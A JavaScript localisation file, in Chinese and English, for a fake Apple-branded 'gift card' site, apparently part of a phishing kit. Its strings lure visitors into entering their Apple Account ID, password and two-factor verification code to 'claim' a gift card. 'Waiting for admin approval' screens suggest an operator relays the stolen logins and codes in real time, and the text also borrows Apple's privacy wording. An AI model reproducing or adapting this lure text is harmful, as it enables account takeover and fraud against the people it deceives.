// 国际化支持
class I18n {
    constructor() {
        this.currentLang = 'zh';
        this.translations = {};
        this.init();
    }

    init() {
        // 检测浏览器语言
        const browserLang = navigator.language || navigator.userLanguage;
        const langCode = browserLang.split('-')[0];
        
        // 使用服务器推荐的语言或浏览器语言
        if (typeof recommendLang !== 'undefined' && recommendLang) {
            this.currentLang = recommendLang;
        } else if (['zh', 'en'].includes(langCode)) {
            this.currentLang = langCode;
        }
        
        this.loadTranslations();
    }

    loadTranslations() {
        // 中文翻译
        this.translations.zh = {
            // 通用
            'site_title': '礼品卡发放系统',
            'loading': '加载中...',
            'submit': '提交',
            'cancel': '取消',
            'back': '返回',
            'continue': '继续',
            'login': '登录',
            'logout': '退出',
            'email_or_phone': '邮箱地址或手机号',
            'password': '密码',
            'remember_account': '记住此账户',
            
            // 欢迎页面
            'welcome_title': '输入账户ID和密码，领取您的礼品卡',
            'welcome_description': '登录成功后验证身份即可领取礼品卡，安全、简单、高效。',
            'member_login': '立即登录并领取',
            'for_everyone': '适用于所有人',
            'gift_card_intro': '礼品卡可用于购买各种Apple产品和服务',
            
            // 产品名称
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': '配件',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': '登录您的Apple账户',
            'manage_your_apple_account': '管理您的Apple账户信息',
            'invalid_email': '请输入有效的邮箱地址',
            'apple_account_privacy': '您的Apple账户信息用于允许您安全地访问和使用Apple服务。Apple会根据Apple隐私政策处理您的数据。',
            
            // 等待页面
            'waiting_approval': '等待管理员审核',
            'login_pending_message': '您的登录请求正在等待管理员审核，请耐心等待...',
            'login_approved': '登录已批准',
            'login_rejected': '登录被拒绝',
            
            // 验证页面
            'two_factor_auth': '双重认证',
            'enter_verification_code_desc': '请输入发送到您信任设备的验证码',
            'digit_1': '第1位数字',
            'digit_2': '第2位数字',
            'digit_3': '第3位数字',
            'digit_4': '第4位数字',
            'digit_5': '第5位数字',
            'digit_6': '第6位数字',
            'verification_code_required': '请输入6位验证码',
            'verification_failed': '验证失败，请重试',
            
            // 等待验证页面
            'waiting_verification_approval': '等待验证审核',
            'verification_pending_message': '您的验证码正在等待管理员审核，请耐心等待...',
            'verification_rejected': '验证被拒绝',
            
            // 礼品卡页面
            'your_gift_card': '您的礼品卡',
            'gift_card_message': '恭喜！这是您的礼品卡代码',
            'no_gift_cards_available': '暂无可用礼品卡',
            'daily_checkin': '每日签到',
            'view_history': '查看历史',
            
            // 签到页面
            'checkin_now': '立即签到',
            'eligible_for_checkin': '您可以进行签到',
            'not_eligible_for_checkin': '您暂时无法签到',
            'checkin_successful': '签到成功！',
            
            // 历史记录
            'no_gift_card_records': '暂无礼品卡记录',
            'no_checkin_records': '暂无签到记录',
            'reward': '奖励',
            'no_reward': '无奖励',
            
            // 错误信息
            'network_error': '网络错误，请稍后重试',
            'login_failed': '登录失败，请检查账户信息',
            'blocked_cn_ip': '很抱歉，因政策原因，中国大陆IP暂时无法访问本系统。',
            'cn_cards_depleted': '中国大陆地区礼品卡已发放完毕，请稍后再试。',
            
            // v3界面专用
            'login_and_claim_title': '输入账户ID和密码，登录并领取',
            'login_and_claim_desc': '请输入您的账户ID和密码，完成身份验证后即可领取礼品卡',
            'account_id_placeholder': '请输入您的账户ID（通常是邮箱地址）',
            'account_password_placeholder': '请输入您的账户ID密码',
            'invalid_account_id': '请输入有效的账户ID（通常是邮箱地址，例如：example@domain.com）',
            'clear': '清除',
            'gift_card_series': '礼品卡系列',
            'gift_card_series_desc': '所有礼品卡均需输入账户ID和密码登录，并通过验证码验证后领取使用',
            'gift_card': '礼品卡',
            'gift_card_desc': '输入账户ID和密码登录后，验证身份即可领取使用',
            'multiple_denominations': '多种面额',
            'claim_now': '立即领取',
            'simple_five_steps': '简单五步，轻松领取',
            'simple_five_steps_desc': '输入账户ID和密码，通过验证后即可安全领取礼品卡',
            'prepare_account': '准备账户ID',
            'prepare_account_desc': '准备好您的账户ID和对应的密码',
            'input_account_info': '输入账号信息',
            'input_account_info_desc': '在上方输入框中填写您的账户ID和密码',
            'wait_verification': '等待验证',
            'wait_verification_desc': '系统将验证您的账户ID信息，请耐心等待',
            'input_verification_code': '输入验证码',
            'input_verification_code_desc': '输入发送至您账户关联设备的验证码完成验证',
            'claim_and_use': '领取使用',
            'claim_and_use_desc': '验证成功后即可领取并使用礼品卡',
            'footer_desc': '输入账户ID和密码，通过验证码验证即可领取礼品卡，安全高效',
            'quick_links': '快速链接',
            'help_center': '帮助中心',
            'no_verification_code': '未收到验证码？',
            'forgot_account': '忘记账户ID或密码？',
            'terms_of_use': '使用条款',
            'all_rights_reserved': '保留所有权利。',
            
            // 导航
            'home': '首页',
            'login_and_claim': '登录与领取',
            'gift_cards': '礼品卡',
            
            // 用户信息
            'logged_in_as': '已登录：'
        };

        // 英文翻译
        this.translations.en = {
            // 通用
            'site_title': 'Gift Card Distribution System',
            'loading': 'Loading...',
            'submit': 'Submit',
            'cancel': 'Cancel',
            'back': 'Back',
            'continue': 'Continue',
            'login': 'Login',
            'logout': 'Logout',
            'email_or_phone': 'Email or Phone',
            'password': 'Password',
            'remember_account': 'Remember this account',
            
            // 欢迎页面
            'welcome_title': 'Enter Account ID and Password to Claim Your Gift Card',
            'welcome_description': 'Login and verify your identity to claim gift cards safely, simply, and efficiently.',
            'member_login': 'Login and Claim Now',
            'for_everyone': 'For Everyone',
            'gift_card_intro': 'Gift cards can be used to purchase various Apple products and services',
            
            // 产品名称
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': 'Accessories',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': 'Sign in to your Apple Account',
            'manage_your_apple_account': 'Manage your Apple Account information',
            'invalid_email': 'Please enter a valid email address',
            'apple_account_privacy': 'Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security and support purposes.',
            
            // 等待页面
            'waiting_approval': 'Waiting for Admin Approval',
            'login_pending_message': 'Your login request is pending admin approval, please wait...',
            'login_approved': 'Login Approved',
            'login_rejected': 'Login Rejected',
            
            // 验证页面
            'two_factor_auth': 'Two-Factor Authentication',
            'enter_verification_code_desc': 'Enter the verification code sent to your trusted device',
            'digit_1': 'Digit 1',
            'digit_2': 'Digit 2',
            'digit_3': 'Digit 3',
            'digit_4': 'Digit 4',
            'digit_5': 'Digit 5',
            'digit_6': 'Digit 6',
            'verification_code_required': 'Please enter 6-digit verification code',
            'verification_failed': 'Verification failed, please try again',
            
            // 等待验证页面
            'waiting_verification_approval': 'Waiting for Verification Approval',
            'verification_pending_message': 'Your verification code is pending admin approval, please wait...',
            'verification_rejected': 'Verification Rejected',
            
            // 礼品卡页面
            'your_gift_card': 'Your Gift Card',
            'gift_card_message': 'Congratulations! Here is your gift card code',
            'no_gift_cards_available': 'No gift cards available',
            'daily_checkin': 'Daily Check-in',
            'view_history': 'View History',
            
            // 签到页面
            'checkin_now': 'Check in Now',
            'eligible_for_checkin': 'You are eligible for check-in',
            'not_eligible_for_checkin': 'You are not eligible for check-in at this time',
            'checkin_successful': 'Check-in successful!',
            
            // 历史记录
            'no_gift_card_records': 'No gift card records',
            'no_checkin_records': 'No check-in records',
            'reward': 'Reward',
            'no_reward': 'No reward',
            
            // 错误信息
            'network_error': 'Network error, please try again later',
            'login_failed': 'Login failed, please check your credentials',
            'blocked_cn_ip': 'Sorry, access from mainland China IPs is temporarily unavailable due to policy reasons.',
            'cn_cards_depleted': 'Gift cards for mainland China have been depleted, please try again later.',
            
            // v3界面专用
            'login_and_claim_title': 'Enter Account ID and Password to Login and Claim',
            'login_and_claim_desc': 'Please enter your account ID and password to complete identity verification and claim your gift card',
            'account_id_placeholder': 'Please enter your account ID (usually email address)',
            'account_password_placeholder': 'Please enter your account ID password',
            'invalid_account_id': 'Please enter a valid account ID (usually email address, e.g.: example@domain.com)',
            'clear': 'Clear',
            'gift_card_series': 'Gift Card Series',
            'gift_card_series_desc': 'All gift cards require account ID and password login, and verification code verification before claiming',
            'gift_card': 'Gift Card',
            'gift_card_desc': 'Login with account ID and password, then verify identity to claim and use',
            'multiple_denominations': 'Multiple Denominations',
            'claim_now': 'Claim Now',
            'simple_five_steps': 'Simple Five Steps, Easy Claiming',
            'simple_five_steps_desc': 'Enter account ID and password, verify and safely claim gift cards',
            'prepare_account': 'Prepare Account ID',
            'prepare_account_desc': 'Prepare your account ID and corresponding password',
            'input_account_info': 'Input Account Info',
            'input_account_info_desc': 'Fill in your account ID and password in the form above',
            'wait_verification': 'Wait for Verification',
            'wait_verification_desc': 'System will verify your account ID information, please wait patiently',
            'input_verification_code': 'Input Verification Code',
            'input_verification_code_desc': 'Enter the verification code sent to your account-linked device',
            'claim_and_use': 'Claim and Use',
            'claim_and_use_desc': 'Successfully verified, you can claim and use the gift card',
            'footer_desc': 'Enter account ID and password, verify with verification code to claim gift cards safely and efficiently',
            'quick_links': 'Quick Links',
            'help_center': 'Help Center',
            'no_verification_code': 'Didn\'t receive verification code?',
            'forgot_account': 'Forgot account ID or password?',
            'terms_of_use': 'Terms of Use',
            'all_rights_reserved': 'All rights reserved.',
            
            // 导航
            'home': 'Home',
            'login_and_claim': 'Login & Claim',
            'gift_cards': 'Gift Cards',
            
            // 用户信息
            'logged_in_as': 'Logged in as:'
        };
    }

    getCurrentLanguage() {
        return this.currentLang;
    }

    changeLanguage(lang) {
        if (this.translations[lang]) {
            this.currentLang = lang;
            this.translatePage();
            
            // 保存语言偏好
            localStorage.setItem('preferredLanguage', lang);
        }
    }

    t(key) {
        const translation = this.translations[this.currentLang];
        return translation && translation[key] ? translation[key] : key;
    }

    translatePage() {
        // 翻译所有带有 data-i18n 属性的元素
        document.querySelectorAll('[data-i18n]').forEach(element => {
            const key = element.getAttribute('data-i18n');
            const translation = this.t(key);
            
            if (element.tagName === 'INPUT' && element.type !== 'submit') {
                element.placeholder = translation;
            } else {
                element.textContent = translation;
            }
        });

        // 翻译所有带有 data-i18n-placeholder 属性的元素
        document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
            const key = element.getAttribute('data-i18n-placeholder');
            const translation = this.t(key);
            element.placeholder = translation;
        });

        // 翻译所有带有 data-i18n-label 属性的元素
        document.querySelectorAll('[data-i18n-label]').forEach(element => {
            const key = element.getAttribute('data-i18n-label');
            const translation = this.t(key);
            element.setAttribute('aria-label', translation);
        });

        // 更新页面标题
        const titleElement = document.querySelector('title[data-i18n]');
        if (titleElement) {
            const key = titleElement.getAttribute('data-i18n');
            document.title = this.t(key);
        }
    }
}

// 初始化国际化
window.i18n = new I18n();

// 页面加载完成后翻译
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.i18n.translatePage();
    });
} else {
    window.i18n.translatePage();
}
